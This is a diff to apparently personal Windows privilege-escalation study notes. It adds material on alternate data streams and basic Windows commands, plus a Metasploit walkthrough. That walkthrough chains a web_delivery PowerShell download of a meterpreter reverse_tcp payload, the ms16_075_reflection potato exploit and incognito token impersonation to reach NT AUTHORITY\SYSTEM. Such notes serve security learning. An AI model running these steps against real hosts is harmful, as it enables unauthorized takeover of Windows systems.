@@ -17,6 +17,10 @@ There are two types of tokens:
 Potato Attacks - In potato attacks we are tricking the "NT AUTHORITY\SYSTEM" account into authenticating via NTLM to a TCP endpoint we control.
 We use the MIM (Man-in-the-middle) technique to attempt (NTLM relay) to locally negotiate a security token for the "NT AUTHORITY\SYSTEM" account. This is done through a series of windows API calls.
 Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.
+
+Alternate data streams - ADS are a file attribute only found on the NTFS file system.
+In this system a file is build u from a couple of attributes, one of them is $Data, aka the data attribute.
+https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
 ```
 # Basic commands:
 ```
@@ -49,6 +53,12 @@ certutil - command like wget.
 cd /users/administrator - command to get to administrator directory.
 ---
 where /R (recursive) c:\windows - command that we can use to find a file on disk c in the windows directory.
+---
+type - command to list a content of a file.
+---
+dir /R - command simillar to ls -arl in linux.
+---
+more < $filename - command to get content of hidden files.
 ---
 ```
 ## Reverse shell using FTP/SMB and meterpreter
@@ -187,4 +197,18 @@ If we got a meterpreter shell we can use the command ---> getprivs and look for 
 We can get information about what all privileges are able to do in the next page ---> https://github.com/gtworek/Priv2Admin.
 For information about potato attacks we can go to this site ---> https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/.
 ```
-
+# Meterpreter potato attack
+```
+We will go on our meterpreter shell and we will use a exploit ---> use exploit/multi/script/web_delivery.
+We will go to options and will set the relevant thing that we need for example:
+LHOST, LPORT, SRVHOST, targets (most cases we will use PSH (powershell)).
+We need to set our payload to windows/meterpreter/reverse_tcp (if we dont use python).
+Lets say we use the psh after we will use the command ---> run, we should get a ps command to copy to our windows shell that we got earlier and we will get a shell (it will show the session that we got our shell on).
+We can use the command ---> run post/multi/recon/local_exploit_suggester (to get the exploits path on meterpreter).
+Now in our case we want to use potato attack we will need to set the exploit. lets say we have the ms16_075_reflection exploit,
+We will use the command ---> use exploit windows/local/ms16_075_reflection (exploit name). 
+After we will use the exploit we will need to set out our options to the relevent once we will need to set the port for a new one and we will need to set our payload to ---> windows/x64/meterpreter/reverse_tcp.
+After we will get the shell we will use the command ---> load incognito (to load incognito extention).
+After we will use list_tokens -u (on the meterpreter shell).
+We will get some tokens that we can impersonate with the command ---> impersonate_token "Token_name" (e.x NT AUTHORITY\SYSTEM).
+```
